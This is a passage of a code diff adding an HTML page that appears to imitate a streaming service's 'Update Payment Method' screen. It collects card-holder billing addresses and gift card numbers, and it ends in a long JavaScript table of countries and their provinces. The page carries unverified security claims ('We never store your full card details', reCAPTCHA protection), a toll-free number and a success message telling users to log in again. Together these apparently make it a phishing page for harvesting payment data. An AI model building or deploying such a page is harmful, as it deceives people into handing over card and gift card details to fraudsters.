+            <option value="PK">🇵🇰 Pakistan</option>
+            <option value="PA">🇵🇦 Panama</option>
+            <option value="PG">🇵🇬 Papua New Guinea</option>
+            <option value="PY">🇵🇾 Paraguay</option>
+            <option value="PE">🇵🇪 Peru</option>
+            <option value="PH">🇵🇭 Philippines</option>
+            <option value="PL">🇵🇱 Poland</option>
+            <option value="PT">🇵🇹 Portugal</option>
+            <!-- Q -->
+            <option value="QA">🇶🇦 Qatar</option>
+            <!-- R -->
+            <option value="RO">🇷🇴 Romania</option>
+            <option value="RW">🇷🇼 Rwanda</option>
+            <!-- S -->
+            <option value="KN">🇰🇳 Saint Kitts and Nevis</option>
+            <option value="LC">🇱🇨 Saint Lucia</option>
+            <option value="VC">🇻🇨 Saint Vincent and the Grenadines</option>
+            <option value="WS">🇼🇸 Samoa</option>
+            <option value="ST">🇸🇹 Sao Tome and Principe</option>
+            <option value="SA">🇸🇦 Saudi Arabia</option>
+            <option value="SN">🇸🇳 Senegal</option>
+            <option value="RS">🇷🇸 Serbia</option>
+            <option value="SC">🇸🇨 Seychelles</option>
+            <option value="SL">🇸🇱 Sierra Leone</option>
+            <option value="SG">🇸🇬 Singapore</option>
+            <option value="SK">🇸🇰 Slovakia</option>
+            <option value="SI">🇸🇮 Slovenia</option>
+            <option value="SB">🇸🇧 Solomon Islands</option>
+            <option value="SO">🇸🇴 Somalia</option>
+            <option value="ZA">🇿🇦 South Africa</option>
+            <option value="KR">🇰🇷 South Korea</option>
+            <option value="SS">🇸🇸 South Sudan</option>
+            <option value="ES">🇪🇸 Spain</option>
+            <option value="LK">🇱🇰 Sri Lanka</option>
+            <option value="SD">🇸🇩 Sudan</option>
+            <option value="SR">🇸🇷 Suriname</option>
+            <option value="SE">🇸🇪 Sweden</option>
+            <option value="CH">🇨🇭 Switzerland</option>
+            <!-- T -->
+            <option value="TW">🇹🇼 Taiwan</option>
+            <option value="TJ">🇹🇯 Tajikistan</option>
+            <option value="TZ">🇹🇿 Tanzania</option>
+            <option value="TH">🇹🇭 Thailand</option>
+            <option value="TL">🇹🇱 Timor-Leste</option>
+            <option value="TG">🇹🇬 Togo</option>
+            <option value="TO">🇹🇴 Tonga</option>
+            <option value="TT">🇹🇹 Trinidad and Tobago</option>
+            <option value="TN">🇹🇳 Tunisia</option>
+            <option value="TR">🇹🇷 Turkey</option>
+            <option value="TM">🇹🇲 Turkmenistan</option>
+            <!-- U -->
+            <option value="UG">🇺🇬 Uganda</option>
+            <option value="UA">🇺🇦 Ukraine</option>
+            <option value="AE">🇦🇪 United Arab Emirates</option>
+            <option value="UY">🇺🇾 Uruguay</option>
+            <option value="UZ">🇺🇿 Uzbekistan</option>
+            <!-- V -->
+            <option value="VU">🇻🇺 Vanuatu</option>
+            <option value="VE">🇻🇪 Venezuela</option>
+            <option value="VN">🇻🇳 Vietnam</option>
+            <!-- Y -->
+            <option value="YE">🇾🇪 Yemen</option>
+            <!-- Z -->
+            <option value="ZM">🇿🇲 Zambia</option>
+            <option value="ZW">🇿🇼 Zimbabwe</option>
+          </select>
+          <label for="bCountry">Country</label>
+          <span class="select-arrow">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
+          </span>
+        </div>
+        <div class="error-line" id="e_bCountry">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+          Please select your country.
+        </div>
+
+        <!-- City + PIN -->
+        <div class="input-row field-gap">
+          <div>
+            <div class="input-wrap" id="w_bCity">
+              <input type="text" id="bCity" placeholder="x" autocomplete="address-level2"
+                oninput="clearErr('w_bCity','e_bCity')">
+              <label for="bCity">City</label>
+              <span class="input-dot"></span>
+            </div>
+            <div class="error-line" id="e_bCity">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+              Please enter a valid city name.
+            </div>
+          </div>
+          <div>
+            <div class="input-wrap" id="w_bPin">
+              <input type="text" id="bPin" placeholder="x" maxlength="10"
+                oninput="clearErr('w_bPin','e_bPin')">
+              <label for="bPin" id="pinLabel">PIN / ZIP code</label>
+              <span class="input-dot"></span>
+            </div>
+            <div class="error-line" id="e_bPin">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+              <span>Please enter a valid postal code.</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- State / Province — shown only after country selected -->
+        <div class="input-wrap field-gap" id="stateWrap" style="display:none">
+          <select id="bState" onchange="this.classList.add('has-value')">
+            <option value="" disabled selected></option>
+          </select>
+          <label for="bState" id="stateLabel">State / Province</label>
+          <span class="select-arrow">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
+          </span>
+        </div>
+
+        <!-- Same-address checkbox -->
+        <div class="check-row" onclick="toggleCheck()">
+          <div class="check-box" id="checkbox">
+            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" id="checkMark" style="display:none">
+              <polyline points="20 6 9 17 4 12"/>
+            </svg>
+          </div>
+          <span class="check-label">Billing address same as card holder address</span>
+        </div>
+
+        <div class="sec-note">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          256-bit TLS encryption. We never store your full card details.
+        </div>
+
+        <button class="btn-continue" id="submitBtn" onclick="handleSubmit(this)" type="button">
+          Update Payment Method
+        </button>
+
+      </div><!-- /cardPanel -->
+
+      <!-- ─── GIFT CARD PANEL ─── -->
+      <div id="giftPanel">
+        <div class="input-wrap" id="w_giftCode">
+          <input type="text" id="giftCode" placeholder="x" maxlength="20"
+            style="text-transform:uppercase;letter-spacing:2px"
+            oninput="clearErr('w_giftCode','e_giftCode')">
+          <label for="giftCode">Gift card number</label>
+          <span class="input-dot"></span>
+        </div>
+        <div class="error-line" id="e_giftCode">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e50914" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="#e50914" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#e50914"/></svg>
+          Please enter a valid gift card number.
+        </div>
+        <div class="sec-note" style="margin-top:14px">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          Gift cards are non-refundable. Balance applied immediately.
+        </div>
+        <button class="btn-continue" id="submitGiftBtn" onclick="handleGiftSubmit(this)" type="button">
+          Redeem
+        </button>
+      </div><!-- /giftPanel -->
+
+      <p class="recaptcha">
+        This page is protected by Google reCAPTCHA to ensure you're not a bot.<br>
+        <a href="#">Learn more.</a>
+      </p>
+    </div><!-- /mainForm -->
+
+    <!-- ══ SUCCESS ══ -->
+    <div id="successSection">
+      <div class="success-icon">
+        <svg width="42" height="42" viewBox="0 0 24 24" fill="none" stroke="#46d369" stroke-width="2.2">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+      </div>
+      <div class="success-badge">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+        Payment Method Updated
+      </div>
+      <div class="success-divider"></div>
+      <p class="success-title">You're all set!</p>
+      <p class="success-subtitle">Your payment method has been successfully updated. Please login again to continue watching.</p>
+      <p class="success-note">Redirecting automatically in a few seconds…</p>
+    </div>
+
+  </div><!-- /form-wrapper -->
+</main>
+
+<footer>
+  <p class="footer-phone">Questions? Call 000-800-919-1743 (Toll-Free)</p>
+  <div class="footer-links">
+    <a href="#">FAQ</a>
+    <a href="#">Help Centre</a>
+    <a href="#">Terms of Use</a>
+    <a href="#">Privacy</a>
+    <a href="#">Cookie Preferences</a>
+    <a href="#">Corporate Information</a>
+  </div>
+  <button class="footer-lang">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/>
+      <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+    </svg>
+    English
+    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
+  </button>
+</footer>
+
+<script>
+// ── Country → States data ─────────────────────────────────────
+const COUNTRY_DATA = {
+  AF:{stateLabel:'Province',pinLabel:'Postal code',states:['Badakhshan','Badghis','Baghlan','Balkh','Bamyan','Daykundi','Farah','Faryab','Ghazni','Ghor','Helmand','Herat','Jawzjan','Kabul','Kandahar','Kapisa','Khost','Kunar','Kunduz','Laghman','Logar','Nangarhar','Nimroz','Nuristan','Paktia','Paktika','Panjshir','Parwan','Samangan','Sar-e Pol','Takhar','Urozgan','Wardak','Zabul']},
+  AL:{stateLabel:'County',pinLabel:'Postal code',states:['Berat','Dibër','Durrës','Elbasan','Fier','Gjirokastër','Korçë','Kukës','Lezhë','Shkodër','Tirana','Vlorë']},
+  DZ:{stateLabel:'Province (Wilaya)',pinLabel:'Postal code',states:['Adrar','Aïn Defla','Aïn Témouchent','Algiers','Annaba','Batna','Béchar','Béjaïa','Biskra','Blida','Bordj Bou Arréridj','Bouira','Boumerdès','Chlef','Constantine','Djelfa','El Bayadh','El Oued','El Tarf','Ghardaïa','Guelma','Illizi','Jijel','Khenchela','Laghouat','Mascara','Médéa','Mila','Mostaganem','Msila','Naâma','Oran','Ouargla','Oum El Bouaghi','Relizane','Saïda','Sétif','Sidi Bel Abbès','Skikda','Souk Ahras','Tamanrasset','Tébessa','Tiaret','Tindouf','Tipaza','Tissemsilt','Tizi Ouzou','Tlemcen']},
+  AO:{stateLabel:'Province',pinLabel:'Postal code',states:['Bengo','Benguela','Bié','Cabinda','Cuando Cubango','Cuanza Norte','Cuanza Sul','Cunene','Huambo','Huíla','Luanda','Lunda Norte','Lunda Sul','Malanje','Moxico','Namibe','Uíge','Zaire']},
+  AR:{stateLabel:'Province',pinLabel:'Postal code',states:['Buenos Aires','Catamarca','Chaco','Chubut','Córdoba','Corrientes','Entre Ríos','Formosa','Jujuy','La Pampa','La Rioja','Mendoza','Misiones','Neuquén','Río Negro','Salta','San Juan','San Luis','Santa Cruz','Santa Fe','Santiago del Estero','Tierra del Fuego','Tucumán']},
+  AM:{stateLabel:'Province',pinLabel:'Postal code',states:['Aragatsotn','Ararat','Armavir','Gegharkunik','Kotayk','Lori','Shirak','Syunik','Tavush','Vayots Dzor','Yerevan']},
+  AU:{stateLabel:'State / Territory',pinLabel:'Postcode',states:['Australian Capital Territory','New South Wales','Northern Territory','Queensland','South Australia','Tasmania','Victoria','Western Australia']},
+  AT:{stateLabel:'State (Bundesland)',pinLabel:'Postleitzahl',states:['Burgenland','Carinthia','Lower Austria','Salzburg','Styria','Tyrol','Upper Austria','Vienna','Vorarlberg']},
+  AZ:{stateLabel:'District',pinLabel:'Postal code',states:['Absheron','Agdam','Agdash','Aghjabadi','Agstafa','Agsu','Astara','Baku','Balakan','Barda','Beylagan','Bilasuvar','Dashkasan','Fuzuli','Ganja','Goranboy','Goychay','Goygol','Hajigabul','Imishli','Ismailli','Jabrayil','Jalilabad','Kalbajar','Kurdamir','Lachin','Lankaran','Lerik','Masalli','Mingachevir','Nakhchivan','Neftchala','Oghuz','Qabala','Qakh','Qazakh','Quba','Qubadli','Qusar','Saatly','Sabirabad','Salyan','Shamakhi','Shaki','Shamkir','Shirvan','Shusha','Siyazan','Sumgayit','Tartar','Tovuz','Ujar','Khachmaz','Khizi','Khojali','Zangilan','Zaqatala','Zardab']},
+  BH:{stateLabel:'Governorate',pinLabel:'Postal code',states:['Capital','Central','Muharraq','Northern','Southern']},
+  BD:{stateLabel:'Division',pinLabel:'Postal code',states:['Barisal','Chittagong','Dhaka','Khulna','Mymensingh','Rajshahi','Rangpur','Sylhet']},
+  BY:{stateLabel:'Region',pinLabel:'Postal code',states:['Brest','Gomel','Grodno','Minsk','Minsk City','Mogilev','Vitebsk']},
+  BE:{stateLabel:'Province',pinLabel:'Postal code',states:['Antwerp','East Flanders','Flemish Brabant','Hainaut','Liège','Limburg','Luxembourg','Namur','Walloon Brabant','West Flanders','Brussels']},
+  BZ:{stateLabel:'District',pinLabel:'Postal code',states:['Belize','Cayo','Corozal','Orange Walk','Stann Creek','Toledo']},
+  BJ:{stateLabel:'Department',pinLabel:'Postal code',states:['Alibori','Atakora','Atlantique','Borgou','Collines','Couffo','Donga','Littoral','Mono','Ouémé','Plateau','Zou']},
+  BT:{stateLabel:'District (Dzongkhag)',pinLabel:'Postal code',states:['Bumthang','Chukha','Dagana','Gasa','Haa','Lhuntse','Mongar','Paro','Pemagatshel','Punakha','Samdrup Jongkhar','Samtse','Sarpang','Thimphu','Trashigang','Trashiyangtse','Trongsa','Tsirang','Wangdue Phodrang','Zhemgang']},
+  BO:{stateLabel:'Department',pinLabel:'Postal code',states:['Beni','Chuquisaca','Cochabamba','La Paz','Oruro','Pando','Potosí','Santa Cruz','Tarija']},
+  BA:{stateLabel:'Canton / Entity',pinLabel:'Postal code',states:['Federation of Bosnia and Herzegovina','Republika Srpska','Brčko District']},
+  BW:{stateLabel:'District',pinLabel:'Postal code',states:['Central','Chobe','Francistown','Gaborone','Ghanzi','Jwaneng','Kgalagadi','Kgatleng','Kweneng','Lobatse','North East','North West','South East','Southern','Selebi-Phikwe','Sowa Town']},
+  BR:{stateLabel:'State',pinLabel:'CEP',states:['Acre','Alagoas','Amapá','Amazonas','Bahia','Ceará','Distrito Federal','Espírito Santo','Goiás','Maranhão','Mato Grosso','Mato Grosso do Sul','Minas Gerais','Pará','Paraíba','Paraná','Pernambuco','Piauí','Rio de Janeiro','Rio Grande do Norte','Rio Grande do Sul','Rondônia','Roraima','Santa Catarina','São Paulo','Sergipe','Tocantins']},
+  BN:{stateLabel:'District',pinLabel:'Postal code',states:['Belait','Brunei-Muara','Temburong','Tutong']},
+  BG:{stateLabel:'Province',pinLabel:'Postal code',states:['Blagoevgrad','Burgas','Dobrich','Gabrovo','Haskovo','Kardzhali','Kyustendil','Lovech','Montana','Pazardzhik','Pernik','Pleven','Plovdiv','Razgrad','Ruse','Shumen','Silistra','Sliven','Smolyan','Sofia City','Sofia','Stara Zagora','Targovishte','Varna','Veliko Tarnovo','Vidin','Vratsa','Yambol']},
+  KH:{stateLabel:'Province',pinLabel:'Postal code',states:['Banteay Meanchey','Battambang','Kampong Cham','Kampong Chhnang','Kampong Speu','Kampong Thom','Kampot','Kandal','Kep','Koh Kong','Kratie','Mondulkiri','Oddar Meanchey','Pailin','Phnom Penh','Preah Sihanouk','Preah Vihear','Prey Veng','Pursat','Ratanakiri','Siem Reap','Stung Treng','Svay Rieng','Takéo','Tboung Khmum']},
+  CM:{stateLabel:'Region',pinLabel:'Postal code',states:['Adamawa','Centre','East','Far North','Littoral','North','North West','South','South West','West']},
+  CA:{stateLabel:'Province / Territory',pinLabel:'Postal code',states:['Alberta','British Columbia','Manitoba','New Brunswick','Newfoundland and Labrador','Northwest Territories','Nova Scotia','Nunavut','Ontario','Prince Edward Island','Quebec','Saskatchewan','Yukon']},
+  CL:{stateLabel:'Region',pinLabel:'Postal code',states:['Arica and Parinacota','Tarapacá','Antofagasta','Atacama','Coquimbo','Valparaíso','Metropolitan Region','O\'Higgins','Maule','Ñuble','Biobío','La Araucanía','Los Ríos','Los Lagos','Aysén','Magallanes']},
+  CN:{stateLabel:'Province',pinLabel:'Postal code',states:['Anhui','Beijing','Chongqing','Fujian','Gansu','Guangdong','Guangxi','Guizhou','Hainan','Hebei','Heilongjiang','Henan','Hong Kong','Hubei','Hunan','Inner Mongolia','Jiangsu','Jiangxi','Jilin','Liaoning','Macau','Ningxia','Qinghai','Shaanxi','Shandong','Shanghai','Shanxi','Sichuan','Tianjin','Tibet','Xinjiang','Yunnan','Zhejiang']},
+  CO:{stateLabel:'Department',pinLabel:'Postal code',states:['Amazonas','Antioquia','Arauca','Atlántico','Bolívar','Boyacá','Caldas','Caquetá','Casanare','Cauca','Cesar','Chocó','Córdoba','Cundinamarca','Guainía','Guaviare','Huila','La Guajira','Magdalena','Meta','Nariño','Norte de Santander','Putumayo','Quindío','Risaralda','San Andrés y Providencia','Santander','Sucre','Tolima','Valle del Cauca','Vaupés','Vichada']},
+  CR:{stateLabel:'Province',pinLabel:'Postal code',states:['Alajuela','Cartago','Guanacaste','Heredia','Limón','Puntarenas','San José']},
+  HR:{stateLabel:'County',pinLabel:'Postal code',states:['Bjelovar-Bilogora','Brod-Posavina','Dubrovnik-Neretva','Istria','Karlovac','Koprivnica-Križevci','Krapina-Zagorje','Lika-Senj','Međimurje','Osijek-Baranja','Požega-Slavonia','Primorje-Gorski Kotar','Šibenik-Knin','Sisak-Moslavina','Split-Dalmatia','Varaždin','Virovitica-Podravina','Vukovar-Syrmia','Zadar','Zagreb City','Zagreb']},
+  CU:{stateLabel:'Province',pinLabel:'Postal code',states:['Artemisa','Camagüey','Ciego de Ávila','Cienfuegos','Granma','Guantánamo','Holguín','La Habana','Las Tunas','Matanzas','Mayabeque','Pinar del Río','Sancti Spíritus','Santiago de Cuba','Villa Clara','Isla de la Juventud']},
+  CY:{stateLabel:'District',pinLabel:'Postal code',states:['Famagusta','Kyrenia','Larnaca','Limassol','Nicosia','Paphos']},
+  CZ:{stateLabel:'Region',pinLabel:'Postal code',states:['Central Bohemia','Hradec Králové','Karlovy Vary','Liberec','Moravia-Silesia','Olomouc','Pardubice','Plzeň','Prague','South Bohemia','South Moravia','Ústí nad Labem','Vysočina','Zlín']},
+  DK:{stateLabel:'Region',pinLabel:'Postal code',states:['Capital Region','Central Denmark','North Denmark','Region Zealand','Southern Denmark']},
+  DO:{stateLabel:'Province',pinLabel:'Postal code',states:['Azua','Bahoruco','Barahona','Dajabón','Distrito Nacional','Duarte','El Seibo','Elías Piña','Espaillat','Hato Mayor','Hermanas Mirabal','Independencia','La Altagracia','La Romana','La Vega','María Trinidad Sánchez','Monseñor Nouel','Monte Cristi','Monte Plata','Pedernales','Peravia','Puerto Plata','Samaná','San Cristóbal','San José de Ocoa','San Juan','San Pedro de Macorís','Sánchez Ramírez','Santiago','Santiago Rodríguez','Santo Domingo','Valverde']},
+  EC:{stateLabel:'Province',pinLabel:'Postal code',states:['Azuay','Bolívar','Cañar','Carchi','Chimborazo','Cotopaxi','El Oro','Esmeraldas','Galápagos','Guayas','Imbabura','Loja','Los Ríos','Manabí','Morona Santiago','Napo','Orellana','Pastaza','Pichincha','Santa Elena','Santo Domingo de los Tsáchilas','Sucumbíos','Tungurahua','Zamora Chinchipe']},
+  EG:{stateLabel:'Governorate',pinLabel:'Postal code',states:['Alexandria','Aswan','Asyut','Beheira','Beni Suef','Cairo','Dakahlia','Damietta','Faiyum','Gharbia','Giza','Ismailia','Kafr el-Sheikh','Luxor','Matruh','Minya','Monufia','New Valley','North Sinai','Port Said','Qalyubia','Qena','Red Sea','Sharqia','Sohag','South Sinai','Suez']},
+  SV:{stateLabel:'Department',pinLabel:'Postal code',states:['Ahuachapán','Cabañas','Chalatenango','Cuscatlán','La Libertad','La Paz','La Unión','Morazán','San Miguel','San Salvador','San Vicente','Santa Ana','Sonsonate','Usulután']},
+  ET:{stateLabel:'Region',pinLabel:'Postal code',states:['Addis Ababa','Afar','Amhara','Benishangul-Gumuz','Dire Dawa','Gambela','Harari','Oromia','Sidama','Somali','Southern Nations','Tigray']},
+  FI:{stateLabel:'Region',pinLabel:'Postal code',states:['Central Finland','Central Ostrobothnia','Kainuu','Kymenlaakso','Lapland','North Karelia','North Ostrobothnia','North Savo','Ostrobothnia','Päijänne Tavastia','Pirkanmaa','Satakunta','South Karelia','South Ostrobothnia','South Savo','Southwest Finland','Tavastia Proper','Uusimaa']},
+  FR:{stateLabel:'Région',pinLabel:'Code postal',states:['Auvergne-Rhône-Alpes','Bourgogne-Franche-Comté','Bretagne','Centre-Val de Loire','Corse','Grand Est','Guadeloupe','Guyane','Hauts-de-France','Île-de-France','La Réunion','Martinique','Mayotte','Normandie','Nouvelle-Aquitaine','Occitanie','Pays de la Loire','Provence-Alpes-Côte d\'Azur']},
+  GE:{stateLabel:'Region',pinLabel:'Postal code',states:['Adjara','Guria','Imereti','Kakheti','Kvemo Kartli','Mtskheta-Mtianeti','Racha-Lechkhumi','Samegrelo-Zemo Svaneti','Samtskhe-Javakheti','Shida Kartli','Tbilisi','Abkhazia','South Ossetia']},
+  DE:{stateLabel:'State (Bundesland)',pinLabel:'Postleitzahl',states:['Baden-Württemberg','Bavaria','Berlin','Brandenburg','Bremen','Hamburg','Hesse','Lower Saxony','Mecklenburg-Vorpommern','North Rhine-Westphalia','Rhineland-Palatinate','Saarland','Saxony','Saxony-Anhalt','Schleswig-Holstein','Thuringia']},
+  GH:{stateLabel:'Region',pinLabel:'Postal code',states:['Ahafo','Ashanti','Bono','Bono East','Central','Eastern','Greater Accra','North East','Northern','Oti','Savannah','Upper East','Upper West','Volta','Western','Western North']},
+  GR:{stateLabel:'Region',pinLabel:'Postal code',states:['Attica','Central Greece','Central Macedonia','Crete','Eastern Macedonia and Thrace','Epirus','Ionian Islands','North Aegean','Peloponnese','South Aegean','Thessaly','Western Greece','Western Macedonia','Mount Athos']},
+  GT:{stateLabel:'Department',pinLabel:'Postal code',states:['Alta Verapaz','Baja Verapaz','Chimaltenango','Chiquimula','El Progreso','Escuintla','Guatemala','Huehuetenango','Izabal','Jalapa','Jutiapa','Petén','Quetzaltenango','Quiché','Retalhuleu','Sacatepéquez','San Marcos','Santa Rosa','Sololá','Suchitepéquez','Totonicapán','Zacapa']},
+  HN:{stateLabel:'Department',pinLabel:'Postal code',states:['Atlántida','Choluteca','Colón','Comayagua','Copán','Cortés','El Paraíso','Francisco Morazán','Gracias a Dios','Intibucá','Islas de la Bahía','La Paz','Lempira','Ocotepeque','Olancho','Santa Bárbara','Valle','Yoro']},
+  HU:{stateLabel:'County',pinLabel:'Postal code',states:['Baranya','Bács-Kiskun','Békés','Borsod-Abaúj-Zemplén','Budapest','Csongrád-Csanád','Fejér','Győr-Moson-Sopron','Hajdú-Bihar','Heves','Jász-Nagykun-Szolnok','Komárom-Esztergom','Nógrád','Pest','Somogy','Szabolcs-Szatmár-Bereg','Tolna','Vas','Veszprém','Zala']},
+  IS:{stateLabel:'Region',pinLabel:'Postal code',states:['Capital Region','Eastern','Northeastern','Northwestern','Southern','Southern Peninsula','Western','Westfjords']},
+  IN:{stateLabel:'State',pinLabel:'PIN code',states:['Andhra Pradesh','Arunachal Pradesh','Assam','Bihar','Chhattisgarh','Delhi','Goa','Gujarat','Haryana','Himachal Pradesh','Jharkhand','Karnataka','Kerala','Madhya Pradesh','Maharashtra','Manipur','Meghalaya','Mizoram','Nagaland','Odisha','Punjab','Rajasthan','Sikkim','Tamil Nadu','Telangana','Tripura','Uttar Pradesh','Uttarakhand','West Bengal','Andaman and Nicobar Islands','Chandigarh','Dadra and Nagar Haveli and Daman and Diu','Jammu and Kashmir','Ladakh','Lakshadweep','Puducherry']},
+  ID:{stateLabel:'Province',pinLabel:'Postal code',states:['Aceh','Bali','Bangka Belitung Islands','Banten','Bengkulu','Central Java','Central Kalimantan','Central Sulawesi','East Java','East Kalimantan','East Nusa Tenggara','Gorontalo','Jakarta','Jambi','Lampung','Maluku','North Kalimantan','North Maluku','North Sulawesi','North Sumatra','Papua','Riau','Riau Islands','South Kalimantan','South Sulawesi','South Sumatra','Southeast Sulawesi','West Java','West Kalimantan','West Nusa Tenggara','West Papua','West Sulawesi','West Sumatra','Yogyakarta']},
+  IR:{stateLabel:'Province',pinLabel:'Postal code',states:['Alborz','Ardabil','Bushehr','Chaharmahal and Bakhtiari','East Azerbaijan','Isfahan','Fars','Gilan','Golestan','Hamadan','Hormozgan','Ilam','Kerman','Kermanshah','Khuzestan','Kohgiluyeh and Boyer-Ahmad','Kurdistan','Lorestan','Markazi','Mazandaran','North Khorasan','Qazvin','Qom','Razavi Khorasan','Semnan','Sistan and Baluchestan','South Khorasan','Tehran','West Azerbaijan','Yazd','Zanjan']},
+  IQ:{stateLabel:'Governorate',pinLabel:'Postal code',states:['Al Anbar','Al Muthanna','Al Qadisiyyah','An Najaf','Arbil','As Sulaymaniyah','Babil','Baghdad','Basra','Dahuk','Dhi Qar','Diyala','Karbala','Kirkuk','Maysan','Nineveh','Saladin','Wasit']},
+  IE:{stateLabel:'County',pinLabel:'Eircode',states:['Carlow','Cavan','Clare','Cork','Donegal','Dublin','Galway','Kerry','Kildare','Kilkenny','Laois','Leitrim','Limerick','Longford','Louth','Mayo','Meath','Monaghan','Offaly','Roscommon','Sligo','Tipperary','Waterford','Westmeath','Wexford','Wicklow']},
+  IL:{stateLabel:'District',pinLabel:'Postal code',states:['Central','Haifa','Jerusalem','Northern','Southern','Tel Aviv']},
+  IT:{stateLabel:'Region',pinLabel:'CAP',states:['Abruzzo','Aosta Valley','Apulia','Basilicata','Calabria','Campania','Emilia-Romagna','Friuli Venezia Giulia','Lazio','Liguria','Lombardy','Marche','Molise','Piedmont','Sardinia','Sicily','Trentino-South Tyrol','Tuscany','Umbria','Veneto']},
+  JM:{stateLabel:'Parish',pinLabel:'Postal code',states:['Clarendon','Hanover','Kingston','Manchester','Portland','Saint Andrew','Saint Ann','Saint Catherine','Saint Elizabeth','Saint James','Saint Mary','Saint Thomas','Trelawny','Westmoreland']},
+  JP:{stateLabel:'Prefecture',pinLabel:'Postal code',states:['Aichi','Akita','Aomori','Chiba','Ehime','Fukui','Fukuoka','Fukushima','Gifu','Gunma','Hiroshima','Hokkaido','Hyogo','Ibaraki','Ishikawa','Iwate','Kagawa','Kagoshima','Kanagawa','Kochi','Kumamoto','Kyoto','Mie','Miyagi','Miyazaki','Nagano','Nagasaki','Nara','Niigata','Oita','Okayama','Okinawa','Osaka','Saga','Saitama','Shiga','Shimane','Shizuoka','Tochigi','Tokushima','Tokyo','Tottori','Toyama','Wakayama','Yamagata','Yamaguchi','Yamanashi']},
+  JO:{stateLabel:'Governorate',pinLabel:'Postal code',states:['Ajloun','Amman','Aqaba','Balqa','Irbid','Jerash','Karak','Ma\'an','Madaba','Mafraq','Tafilah','Zarqa']},
+  KZ:{stateLabel:'Region',pinLabel:'Postal code',states:['Abai','Akmola','Aktobe','Almaty','Almaty City','Astana','Atyrau','East Kazakhstan','Jetisu','Karaganda','Kostanay','Kyzylorda','Mangystau','North Kazakhstan','Pavlodar','Shymkent','Turkistan','West Kazakhstan','Zhetysu']},
+  KE:{stateLabel:'County',pinLabel:'Postal code',states:['Baringo','Bomet','Bungoma','Busia','Elgeyo-Marakwet','Embu','Garissa','Homa Bay','Isiolo','Kajiado','Kakamega','Kericho','Kiambu','Kilifi','Kirinyaga','Kisii','Kisumu','Kitui','Kwale','Laikipia','Lamu','Machakos','Makueni','Mandera','Marsabit','Meru','Migori','Mombasa','Murang\'a','Nairobi','Nakuru','Nandi','Narok','Nyamira','Nyandarua','Nyeri','Samburu','Siaya','Taita Taveta','Tana River','Tharaka-Nithi','Trans Nzoia','Turkana','Uasin Gishu','Vihiga','Wajir','West Pokot']},
+  KW:{stateLabel:'Governorate',pinLabel:'Postal code',states:['Al Ahmadi','Al Asimah','Al Farwaniyah','Al Jahra','Hawalli','Mubarak Al-Kabeer']},
+  KG:{stateLabel:'Region',pinLabel:'Postal code',states:['Batken','Bishkek','Chuy','Issyk-Kul','Jalal-Abad','Naryn','Osh','Osh City','Talas']},
+  LA:{stateLabel:'Province',pinLabel:'Postal code',states:['Attapeu','Bokeo','Bolikhamsai','Champasak','Houaphanh','Khammouane','Luang Namtha','Luang Prabang','Oudomxay','Phongsali','Salavan','Savannakhet','Vientiane','Vientiane Prefecture','Xaisomboun','Xékong','Xiangkhouang']},
+  LV:{stateLabel:'Region',pinLabel:'Postal code',states:['Adaži','Aizkraukle','Alūksne','Augšdaugava','Ādaži','Bauska','Cēsis','Dienvidkurzeme','Dobele','Gulbene','Jelgava','Jēkabpils','Jūrmala','Krāslava','Kuldīga','Ķekava','Limbaži','Līvāni','Ludza','Madona','Mārupe','Ogre','Olaine','Preiļi','Rēzekne','Riga','Ropaži','Saldus','Sigulda','Smiltene','Talsi','Tukums','Valka','Valmiera','Varakļāni','Ventspils']},
+  LB:{stateLabel:'Governorate',pinLabel:'Postal code',states:['Akkar','Baalbek-Hermel','Beirut','Beqaa','Mount Lebanon','Nabatieh','North Lebanon','South Lebanon']},
